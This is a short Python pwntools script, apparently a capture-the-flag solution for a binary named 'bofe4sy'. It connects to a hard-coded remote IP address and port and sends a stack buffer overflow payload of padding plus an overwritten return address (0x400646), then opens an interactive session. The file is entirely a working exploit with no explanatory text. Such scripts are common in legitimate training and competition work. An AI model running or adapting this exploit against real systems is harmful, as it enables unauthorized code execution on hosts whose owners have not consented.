#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = '140.110.112.31'
prot = 2121
r = remote(ip, prot)
#r = process("./bofe4sy")

r.recvuntil("Read your input:")
r.sendline(b"A" * 32 + b"x" * 8 + p64(0x400646))

r.interactive()
